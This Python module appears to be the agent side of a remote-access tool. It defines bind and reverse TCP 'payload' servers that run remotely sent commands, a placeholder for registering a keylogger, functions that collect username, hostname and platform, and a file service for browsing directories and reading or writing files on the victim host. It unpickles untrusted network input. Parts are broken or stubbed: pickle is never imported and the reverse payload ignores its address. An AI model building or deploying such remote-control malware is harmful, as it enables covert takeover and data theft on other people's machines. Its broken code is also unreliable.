# -*- coding: utf-8 -*-

import platform
import socket
import socketserver
import sys

from .. import sock
from .. import rpc


class Payload(rpc.RPCDispatcher):

    def register_file_service(self, mode):
        pass

    def register_keylogger(self):
        pass


class TCPPayloadRequestHandler(socketserver.BaseRequestHandler):
    Connection = sock.TCPConnection
    marshaller = pickle

    def setup(self):
        self.payload = self.server
        self.connection = self.Connection(self.request)

    def handle(self):
        try:
            while True:
                data = self.recv()
                func_name, args, kwargs = self.loads(data)
                try:
                    r = self.dispatch(func_name, args, kwargs)
                except Exception as e:
                    self.send(self.dumps(e))
                else:
                    self.send(self.dumps(r))
        except EOFError:
            pass

    def send(self, data):
        self.connection.send(data)

    def recv(self):
        return self.connection.recv()

    def loads(self, data):
        return self.marshaller.loads(data)

    def dumps(self, obj):
        return self.marshaller.dumps(obj)

    def dispatch(self, func_name, args, kwargs):
        return self.payload.dispatch(func_name, args, kwargs)


class TCPPayload(Payload):
    RequestHandler = TCPPayloadRequestHandler

    def __init__(self, RequestHandler=None):
        if RequestHandler is not None:
            self.RequestHandler = RequestHandler

    def handle_request(self, request):
        client_address = None
        return self.RequestHandler(
            request,
            client_address,
            self,
        )


class TCPBindPayload(socketserver.TCPServer, TCPPayload):

    def __init__(self, server_address, RequestHandler=None):
        TCPPayload.__init__(self,
            RequestHandler=RequestHandler,
        )
        socketserver.TCPServer.__init__(self,
            server_address,
            self.RequestHandler,
        )


class TCPReversePayload(sock.TCPClient, TCPPayload):

    def __init__(self, addr, retry_interval=1):
        TCPPayload.__init__(self)
        sock.TCPClient.__init__(self)


def uname():
    import platform
    return platform.uname()


def get_file_size(path):
    import os
    return os.path.getsize(path)


def get_username():
    import getpass
    return getpass.getuser()


def get_hostname():
    import socket
    return socket.gethostname()


def get_platform():
    import sys
    return sys.platform


def list_dir(path):
    import os
    return os.listdir(path)


def change_dir(path):
    import os
    path = os.path.expanduser(path)
    os.chdir(path)


def get_current_dir():
    import os
    return os.getcwd()


class FileService:

    def __new__(cls, r=True, w=True):
        class _FileService(FileOpener, FileReader, FileWriter):
            pass
        return _FileService()


class FileOpener:

    def __init__(self):
        self.open_files = dict()

    def open_file(self, path, mode='r'):
        f = open(path, mode)
        fid = id(f)
        self.open_files[fid] = f
        return fid

    def close_file(self, fid):
        if fid not in self.open_files:
            return
        f = self.open_files[fid]
        f.close()
        del self.open_files[fid]


class FileReader:

    def read_file(self, fid, size):
        import base64
        f = self.open_files[fid]
        data = f.read(size)
        return base64.urlsafe_b64encode(data)


class FileWriter:

    def write_file(self, fid, data):
        import base64
        f = self.open_files[fid]
        data = base64.urlsafe_b64decode(data)
        f.write(data)
        f.flush()

